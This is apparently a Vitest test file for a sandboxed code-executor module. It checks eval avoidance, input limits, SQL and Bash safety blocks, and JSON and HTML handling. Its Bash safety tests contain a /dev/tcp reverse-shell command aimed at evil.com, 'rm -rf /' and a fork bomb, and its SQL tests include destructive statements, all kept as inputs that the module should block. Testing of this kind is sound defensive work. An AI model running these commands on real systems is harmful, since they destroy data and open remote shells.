/**
 * Tests for Code Executor Module
 *
 * Verifies:
 * - eval() is NEVER used (CRITICAL security fix)
 * - Code execution delegates to sandbox providers
 * - Input validation (max length, required fields)
 * - Dangerous pattern detection (defense-in-depth)
 * - SQL destructive-without-WHERE validation
 * - Bash dangerous pattern blocking
 * - JSON validation works correctly
 * - HTML/CSS preview works without sandbox
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock the sandbox code-executor to avoid actual sandbox creation
vi.mock('@/lib/sandbox/code-executor', () => ({
  executeInSandbox: vi.fn().mockImplementation(async (code: string, language: string) => {
    // Simulate successful sandbox execution
    if (language === 'javascript') {
      return {
        output: 'Hello, World!',
        error: undefined,
        executionTime: 50,
        exitCode: 0,
      };
    }
    if (language === 'python') {
      return {
        output: 'Hello from Python!',
        error: undefined,
        executionTime: 100,
        exitCode: 0,
      };
    }
    if (language === 'bash') {
      return {
        output: 'Hello from Bash!',
        error: undefined,
        executionTime: 30,
        exitCode: 0,
      };
    }
    return {
      output: '',
      error: 'Unsupported language',
      executionTime: 0,
      exitCode: 1,
    };
  }),
}));

// Mock the logger
vi.mock('@/lib/utils/logger', () => ({
  createLogger: () => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  }),
}));

import { executeCode, getCodeTemplate } from '@/lib/code-executor/code-executor';
import type { CodeLanguage } from '@/lib/code-executor/code-executor';

describe('Code Executor - Security', () => {
  it('should never use eval() — verify source code does not contain eval(', async () => {
    // Read the source file and verify eval( is not present
    const fs = await import('fs');
    const path = await import('path');
    // process.cwd() is already the 'web' directory when running tests from it
    const sourcePath = path.join(process.cwd(), 'lib/code-executor/code-executor.ts');
    const source = fs.readFileSync(sourcePath, 'utf-8');

    // Strategy: Remove all lines that are part of DANGEROUS_PATTERNS definition,
    // then remove comments, strings, and check for eval( as a function call
    const lines = source.split('\n');
    const filteredLines = lines.filter(line => {
      // Skip lines that are part of the DANGEROUS_PATTERNS array definition
      // These contain regex patterns like /\beval\s*\(/ which are NOT eval() calls
      const trimmed = line.trim();
      if (trimmed.startsWith('{ pattern:') || trimmed.startsWith('description:')) return false;
      if (trimmed === '];' || trimmed === '[') return false;
      return true;
    });
    const codeOnly = filteredLines
      .join('\n')
      .replace(/\/\/.*$/gm, '')       // Remove single-line comments
      .replace(/\/\*[\s\S]*?\*\//g, '') // Remove multi-line comments
      .replace(/'[^']*'/g, "''")       // Remove single-quoted strings
      .replace(/"[^"]*"/g, '""')       // Remove double-quoted strings
      .replace(/`[^`]*`/g, '``');      // Remove template literals

    // Should NOT contain eval( as a function call (not inside a regex, comment, or pattern definition)
    expect(codeOnly).not.toMatch(/\beval\s*\(/);
  });

  it('should reject code exceeding maximum length', async () => {
    const longCode = 'x'.repeat(50001);
    const result = await executeCode({ code: longCode, language: 'javascript' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('maximum length');
  });

  it('should reject empty code', async () => {
    const result = await executeCode({ code: '', language: 'javascript' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('required');
  });

  it('should detect dangerous patterns and include warnings', async () => {
    const dangerousCode = 'const env = process.env; console.log(env);';
    const result = await executeCode({ code: dangerousCode, language: 'javascript' });

    // Execution should still proceed (sandbox provides isolation)
    // But warnings should be present
    expect(result.warnings).toBeDefined();
    expect(result.warnings?.length).toBeGreaterThan(0);
    expect(result.warnings?.some(w => w.includes('process object access'))).toBe(true);
  });

  it('should detect require() pattern in warning', async () => {
    const code = 'const fs = require("fs");';
    const result = await executeCode({ code, language: 'javascript' });

    expect(result.warnings).toBeDefined();
    expect(result.warnings?.some(w => w.includes('require()'))).toBe(true);
  });

  it('should detect eval() nesting pattern in warning', async () => {
    const code = 'eval("1+1");';
    const result = await executeCode({ code, language: 'javascript' });

    expect(result.warnings).toBeDefined();
    expect(result.warnings?.some(w => w.includes('eval() call'))).toBe(true);
  });
});

describe('Code Executor - JavaScript/TypeScript', () => {
  it('should delegate JS execution to sandbox', async () => {
    const result = await executeCode({ code: 'console.log("hello")', language: 'javascript' });

    expect(result.success).toBe(true);
    expect(result.output).toContain('Hello, World!');
    expect(result.language).toBe('javascript');
  });

  it('should delegate TypeScript execution to sandbox', async () => {
    const result = await executeCode({ code: 'const x: number = 1;', language: 'typescript' });

    expect(result.success).toBe(true);
    expect(result.language).toBe('javascript'); // TS uses same JS sandbox path
  });

  it('should return sandbox-unavailable error when sandbox fails', async () => {
    // Dynamic import will fail in test environment when mock is cleared
    const { executeInSandbox } = await import('@/lib/sandbox/code-executor');
    vi.mocked(executeInSandbox).mockRejectedValueOnce(new Error('No sandbox provider'));

    const result = await executeCode({ code: '1+1', language: 'javascript' });

    // Should NOT fall back to eval — should return error
    expect(result.success).toBe(false);
    expect(result.error).toContain('sandbox provider');
    expect(result.error).not.toContain('undefined'); // No leaking eval artifacts
  });
});

describe('Code Executor - Python', () => {
  it('should delegate Python execution to sandbox', async () => {
    const result = await executeCode({ code: 'print("hello")', language: 'python' });

    expect(result.success).toBe(true);
    expect(result.language).toBe('python');
  });

  it('should return sandbox-unavailable error when sandbox fails', async () => {
    const { executeInSandbox } = await import('@/lib/sandbox/code-executor');
    vi.mocked(executeInSandbox).mockRejectedValueOnce(new Error('No sandbox provider'));

    const result = await executeCode({ code: 'print("hello")', language: 'python' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('sandbox provider');
  });
});

describe('Code Executor - SQL Safety', () => {
  it('should validate SQL syntax', async () => {
    const result = await executeCode({ code: 'SELECT * FROM users;', language: 'sql' });

    expect(result.success).toBe(true);
    expect(result.output).toContain('syntax valid');
  });

  it('should reject invalid SQL syntax', async () => {
    const result = await executeCode({ code: 'NOT SQL AT ALL', language: 'sql' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('Invalid SQL');
  });

  it('should block DELETE without WHERE clause', async () => {
    const result = await executeCode({ code: 'DELETE FROM users;', language: 'sql' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('WHERE clause');
  });

  it('should block UPDATE without WHERE clause', async () => {
    const result = await executeCode({ code: 'UPDATE users SET name = "hacked";', language: 'sql' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('WHERE clause');
  });

  it('should block DROP TABLE entirely (destructive without WHERE)', async () => {
    const result = await executeCode({ code: 'DROP TABLE users;', language: 'sql' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('WHERE clause');
  });

  it('should allow DELETE with WHERE clause', async () => {
    const result = await executeCode({ code: 'DELETE FROM users WHERE id = 1;', language: 'sql' });

    expect(result.success).toBe(true);
  });

  it('should allow UPDATE with WHERE clause', async () => {
    const result = await executeCode({ code: 'UPDATE users SET name = "bob" WHERE id = 1;', language: 'sql' });

    expect(result.success).toBe(true);
  });
});

describe('Code Executor - Bash Safety', () => {
  it('should block rm -rf / pattern', async () => {
    const result = await executeCode({ code: 'rm -rf /', language: 'bash' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('dangerous pattern');
  });

  it('should block fork bomb pattern', async () => {
    // Fork bomb with various spacings
    const result = await executeCode({ code: ':() { :|:& };:', language: 'bash' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('dangerous pattern');
  });

  it('should block reverse shell via /dev/tcp', async () => {
    // The regex catches any /dev/tcp/ usage
    const result = await executeCode({ code: 'bash -i >& /dev/tcp/evil.com/4444 0>&1', language: 'bash' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('dangerous pattern');
  });

  it('should delegate safe bash commands to sandbox', async () => {
    const result = await executeCode({ code: 'echo hello', language: 'bash' });

    expect(result.success).toBe(true);
  });
});

describe('Code Executor - JSON Validation', () => {
  it('should validate valid JSON', async () => {
    const result = await executeCode({ code: '{"key": "value"}', language: 'json' });

    expect(result.success).toBe(true);
    expect(result.output).toContain('Valid JSON');
  });

  it('should reject invalid JSON', async () => {
    const result = await executeCode({ code: '{invalid json}', language: 'json' });

    expect(result.success).toBe(false);
    expect(result.error).toContain('Invalid JSON');
  });
});

describe('Code Executor - HTML/CSS Preview', () => {
  it('should return preview message for HTML', async () => {
    const result = await executeCode({ code: '<h1>Hello</h1>', language: 'html' });

    expect(result.success).toBe(true);
    expect(result.output).toContain('preview');
  });

  it('should return preview message for CSS', async () => {
    const result = await executeCode({ code: 'body { color: red; }', language: 'css' });

    expect(result.success).toBe(true);
    expect(result.output).toContain('preview');
  });
});

describe('Code Executor - Templates', () => {
  it('should return a template for each language', () => {
    const languages: CodeLanguage[] = ['javascript', 'typescript', 'python', 'html', 'css', 'sql', 'bash', 'json'];

    for (const lang of languages) {
      const template = getCodeTemplate(lang);
      expect(template).toBeTruthy();
      expect(template.length).toBeGreaterThan(10);
    }
  });

  it('should return empty string for unknown language', () => {
    // @ts-expect-error - Testing invalid input
    const template = getCodeTemplate('brainfuck');
    expect(template).toBe('');
  });
});
